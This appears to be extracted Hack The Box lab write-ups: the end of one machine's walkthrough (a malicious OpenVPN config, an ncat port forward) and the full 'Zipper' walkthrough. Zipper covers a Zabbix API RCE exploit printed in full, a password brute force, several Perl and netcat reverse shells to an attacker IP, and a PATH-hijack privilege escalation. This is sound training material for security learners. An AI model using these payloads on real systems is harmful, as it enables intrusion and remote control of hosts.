 
Wfuzz finds the file "notes". 
 
This reveals that the .ovpn file has been chmod 777, and is editable by www-data.  
 
 
 
Page 8 / 13 
 
An informative blog post by Jacob Baines details the exploitation of OpenVPN configuration files. 
https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d
38da 
Using this as reference, the payload below is created, and after clicking "Test VPN", and reverse 
shell is received as root@DNS, and the user flag on Dave’s desktop can be captured. 
 
remote 192.168.122.1 
ifconfig 10.200.0.2 10.200.0.1 
dev tun 
script-security 2 
nobind 
up ​"/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/1337 0<&1 2>&1&'" 
 
 
 
SSH credentials to access 192.168.122.4 are found in Dave’s home directory. Dave is able to run 
any command as root using sudo. 
dave:dav3gerous567 
Page 9 / 13 
 
Vault (192.168.5.2) 
The file /var/log/auth.log is examined, and interesting nmap and ncat commands targeting 
192.168.5.2 are visible. 
 
Nmap reveals the closed ports 53 and 4444. Specifying either port 53 or 4444 as the source port 
reveals that port 987 is open. 
 
ncat (with source port set to 53) reveals that SSH is listening on port 987. 
 
A ncat listener is stood up, to connect to 192.168.5.2 on port 987. 
 
Page 10 / 13 
 
ncat -l 4444 --sh-exec ​"ncat 192.168.5.2 987 -p 53"​ & 
 
It is now possible to ssh to Vault as Dave using the password dav3gerous567, specifying port 
4444. 
 
 
 
 
 
 
 
 
Page 11 / 13 
 
PGP Encrypted Root Flag 
Enumeration of Dave’s home directory reveals a PGP encrypted root flag. GPG can be used to 
decrypt this, and it is installed on all hosts. However, there are no keys on Vault or DNS. The ID of 
the key used to encrypt the file is "D1EB1F03".  
 
This key is available on the host "Ubuntu". 
 
 
Page 12 / 13 
 
A further ncat listener is established in order to transfer to the file from Vault to DNS using SCP.  
 
This is then transferred to Ubuntu. 
 
scp dave@192.168.122.4:/home/dave/root.txt.gpg . 
 
The file is successfully decrypted using the passphrase "itscominghome" and the root flag is 
captured. 
 
 
 
Page 13 / 13 
 
 
 
 
 
 
Zipper 
18​th​ February 2019 / Document No D19.100.08 
Prepared By: egre55 
Machine Author: burmat 
Difficulty: ​Medium 
Classification: Official 
 
 
Page 1 / 15 
 
 
SYNOPSIS 
Zipper is a medium difficulty machine that highlights how privileged API access can be leveraged 
to gain RCE, and the risk of unauthenticated agent access. It also provides an interesting 
challenge in terms of overcoming command processing timeouts, and also highlights the dangers 
of not specifying absolute paths in privileged admin scripts/binaries. 
 
Skills Required 
●
Basic knowledge of Linux 
●
Basic knowledge of Web enumeration 
tools 
 
Skills Learned 
●
Zabbix API enumeration 
●
Exploit modification 
●
Zabbix Agent command execution 
●
Overcoming reverse shell 
disconnects/timeouts 
●
Relative path hijacking 
 
 
 
 
 
 
 
 
 
Page 2 / 15 
 
Enumeration 
Nmap 
 
masscan -p1-65535,U:1-65535 10.10.10.108 --rate=1000 -p1-65535,U:1-65535 -e tun0 > ports 
ports=$(cat ports | awk -F ​" "​ ​'{print $4}'​ | awk -F ​"/"​ ​'{print $1}'​ | sort -n | tr ​'\n' 
','​ | sed ​'s/,$//'​) 
nmap -Pn -sV -sC -p​$ports​ 10.10.10.108 
 
SSH and an Apache httpd 2.4.29 web server are available. Port 10050 is also listed, which 
according to the Internet Assigned Numbers Authority (IANA), is associated with the Zabbix 
Agent. Zabbix is an open-source monitoring software tool that is cable of monitoring a range of 
networks, devices and services. 
https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.txt 
Visiting http://10.10.10.108/zabbix confirms that Zabbix is installed. 
 
 
Page 3 / 15 
 
Zabbix 
Guest 
Attempting a log in with the default credentials ​admin:zabbix​ is unsuccessful. After clicking 
"sign in as guest", the Zabbix console is visible. The user "zapper" on host "zabbix" is referenced. 
The version of Zabbix is 3.0. 
 
Admin account 
Patator is used in an online brute force attack, in an attempt to reveal the password for "zapper". 
Unsuccessful logins result in the error: "Login name or password is incorrect.", and patator is 
configured to ignore responses with this text. The SecLists "darkweb2017-top1000.txt" wordlist is 
used. It is quite common for accounts (web, service accounts etc.) to have the password set as 
the username, and so "zapper" is added to the top of the wordlist. 
 
$ git ​clone​ https://github.com/danielmiessler/SecLists 
$ patator http_fuzz url=http://10.10.10.108/zabbix/index.php method=POST 
body=​'name=zapper&password=FILE0&autologin=1&enter=Sign+in' 
0=/usr/share/SecLists/Passwords/darkweb2017-top1000.txt accept_cookie=1  follow=1 
-x ignore:fgrep=​'Login name or password is incorrect.' 
 
The password "zapper" has been found. 
 
 
Page 4 / 15 
 
However, this account doesn’t have access to the GUI. 
 
 
 
 
 
 
 
 
 
 
 
 
Page 5 / 15 
 
API 
It seems that Zabbix has an API, and the documentation provides example JSON for interacting 
with it.  
https://www.zabbix.com/documentation/3.0/manual/api 
The user authentication token is requested: 
 
$ curl -i -X POST -H ​'Content-type:application/json'​ -d 
'{"jsonrpc":"2.0","method":"user.login","params":{ 
"user":"zapper","password":"zapper"},"auth":null,"id":0}'  
 
{"jsonrpc":"2.0","result":"12eb58fd8324c625dd914ea29cc4c515","id":0} 
 
The host names and interfaces are then requested. 
 
$ curl -i -X POST -H ​'Content-type:application/json'​ -d 
'{"jsonrpc":"2.0","method":"host.get","params":{ "output": 
["hostid","host"],"selectInterfaces":["interfaceid","ip"] 
},"auth":"7620466afc69242a93c6f28b7f89305c","id":0}' 
 
{"jsonrpc":"2.0","result":[{"hostid":"10105","host":"Zabbix","interfaces":[{"interfac
eid":"1","ip":"127.0.0.1"}]},{"hostid":"10106","host":"Zipper","interfaces":[{"interf
aceid":"2","ip":"172.17.0.1"}]}],"id":0} 
 
SearchSploit contains an exploit created by Alexander Gurin, which leverages the Zabbix API to 
achieve RCE. 
 
 
Page 6 / 15 
 
Foothold 
The exploit is copied/downloaded, and the Zabbix root, hostid, login and password are entered 
(see ​Appendix A​). 
https://www.exploit-db.com/exploits/39937  
 
The exploit works very well, and the presence of ".dockerenv" reveals that the foothold is within a 
Docker container. 
 
 
 
 
In order to upgrade to a proper shell, the following Perl "one-liner" is issued. 
 
$ python zabbix_api_pwn.py  
 
[zabbix_cmd]>>:  perl -e ​'use 
Socket;$i="10.10.14.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));i
f(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");op
en(STDERR,">&S");exec("/bin/sh -i");};'​ & 
Page 7 / 15 
 
 
$ SHELL=/bin/bash script -q /dev/null 
$ CTRL + Z 
$ stty raw -​echo 
$ ​fg 
$ reset 
$ xterm 
$ ​export​ TERM=xterm 
 
 
 
 
 
 
 
 
 
 
Page 8 / 15 
 
Lateral Movement 
 
The Zabbix server configuration file is examined and SQLite database credentials are discovered. 
 
$ cat /etc/zabbix/zabbix_server.conf 
 
 
The Docker IP address is 172.17.0.2 and default gateway is 172.17.0.1. The Zabbix Agent (port 
10050) is accessible on 172.17.0.1. 
 
 
 
According to the Zabbix documentation, it is possible to execute system commands on remote 
agent endpoints using the Zabbix Agent "system.run" command. 
 
 
Source: ​https://www.zabbix.com/documentation/3.4/manual/config/items/itemtypes/zabbix_agent 
Page 9 / 15 
 
The output of "ls -al" reveals that that the directory "/backups" is available on both the container 
and host, which indicates that a shared folder has been configured. Indeed, files created here on 
the Docker container are confirmed accessible from the host. 
 
$ ​echo​ system.run[ cat /etc/hosts ] | nc 172.17.0.1 10050 
$ ​echo​ system.run[ id ] | nc 172.17.0.1 10050 
$ ​echo​ system.run[ ls -al / ] | nc 172.17.0.1 10050 
 
A reverse shell would make the job of post-exploitation on 172.17.0.1 much easier. By default, 
Zabbix Agent tasks will time out after 3 seconds, meaning that the shell will effectively die on 
arrival. To work around this limitation, a command is piped into the waiting listener, so that the 
reverse shell spawns another shell immediately upon arrival, which remains intact. 
The file "​/backups/shell.pl​" is created with the following Perl reverse shell: 
 
use 
Socket;​$i​=​"10.10.14.2"​;​$p​=8444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(​"tcp"​));
if​(connect(S,sockaddr_in(​$p​,inet_aton(​$i​)))){open(STDIN,​">&S"​);open(STDOUT,​">&S"​);o
pen(STDERR,​">&S"​);​exec​(​"/bin/sh -i"​);}; 
 
The listeners are stood up: 
 
$ ​printf​ ​"perl /backups/shell.pl\n"​ | nc -lvp 8443 
$ nc -lvnp 8444 
 
Finally, the Agent task is executed: 
 
$ ​echo​ ​"system.run[ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 
10.10.14.2 8443 >/tmp/f & ]"​ | nc 172.17.0.1 10050 
 
 
A reverse shell is received as zabbix on zipper (10.10.10.108), which is immediately upgraded. 
 
Page 10 / 15 
 
Privilege Escalation 
 
The "zabbix-service" setuid binary is identified, which provides the ability to start and stop the 
zabbix-agent service. The service name is discovered after examining the binary with the 
"strings" utility. 
 
$ find / -perm -4000 2>/dev/null 
$ strings /home/zapper/utils/zabbix-service 
 
 
 
The absolute path to systemctl has not been used. By creating a malicious "systemctl" and 
making its location the first PATH entry, command execution can be hijacked. 
 
 
 
The malicious "systemctl" is created with a Perl reverse shell as contents. 
 
Page 11 / 15 
 
$ ​cd​ /var/tmp 
$ pico systemctl 
$ chmod +x systemctl 
 
perl -e 'use 
Socket;$i="10.10.14.2";$p=8000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if
(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(
STDERR,">&S");exec("/bin/sh -i");};' 
 
The location "/var/tmp" is made the first PATH entry, the zabbix-service binary is run and service 
"started". 
 
$ ​echo​ ​$PATH 
$ ​export​ PATH=$(​pwd​):​$PATH 
$ ​echo​ ​$PATH 
$ /home/zapper/utils/zabbix-service 
start 
 
A reverse shell running as root is received and the user and root flags can be captured. 
 
 
 
 
 
 
 
 
Page 12 / 15 
 
Appendix A 
 
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
 
# Exploit Title: Zabbix RCE with API JSON-RPC 
# Date: 06-06-2016 
# Exploit Author: Alexander Gurin 
# Vendor Homepage: http://www.zabbix.com 
# Software Link: http://www.zabbix.com/download.php 
# Version: 2.2 - 3.0.3 
# Tested on: Linux (Debian, CentOS) 
# CVE : N/A 
 
import​ requests 
import​ json 
import​ readline 
 
ZABIX_ROOT = ​'http://10.10.10.108/zabbix' ### Zabbix IP-address 
url = ZABIX_ROOT + ​'/api_jsonrpc.php'
### Don't edit 
 
login = ​'zapper'
### Zabbix login 
password = ​'zapper'
### Zabbix password 
hostid = ​'10105'
### Zabbix hostid 
 
### auth 
payload = { 
 
"jsonrpc"​ : ​"2.0"​, 
    ​"method"​ : ​"user.login"​, 
    ​"params"​: { 
 
'user'​: ​""​+login+​""​, 
 
'password'​: ​""​+password+​""​, 
    }, 
 
"auth"​ : ​None​, 
    ​"id"​ : ​0​, 
} 
Page 13 / 15 
 
headers = { 
    ​'content-type'​: ​'application/json'​, 
} 
 
auth  = requests.post(url, data=json.dumps(payload), headers=(headers)) 
auth = auth.json() 
 
while​ ​True​: 
cmd = raw_input(​'\033[41m[zabbix_cmd]>>: \033[0m '​) 
if​ cmd == ​""​ : ​print​ ​"Result of last command:" 
if​ cmd == ​"quit"​ : ​break 
 
### update 
payload = { 
"jsonrpc"​: ​"2.0"​, 
"method"​: ​"script.update"​, 
"params"​: { 
    ​"scriptid"​: ​"1"​, 
    ​"command"​: ​""​+cmd+​"" 
}, 
"auth"​ : auth[​'result'​], 
"id"​ : ​0​, 
} 
 
cmd_upd = requests.post(url, data=json.dumps(payload), 
headers=(headers)) 
 
### execute 
payload = { 
"jsonrpc"​: ​"2.0"​, 
"method"​: ​"script.execute"​, 
"params"​: { 
    ​"scriptid"​: ​"1"​, 
    ​"hostid"​: ​""​+hostid+​"" 
}, 
"auth"​ : auth[​'result'​], 
"id"​ : ​0​, 
} 
 
Page 14 / 15 
 
cmd_exe = requests.post(url, data=json.dumps(payload), 
headers=(headers)) 
cmd_exe = cmd_exe.json() 
print​ cmd_exe[​"result"​][​"value"​] 
zabbix_api_pwn.py 
 
 
Page 15 / 15 
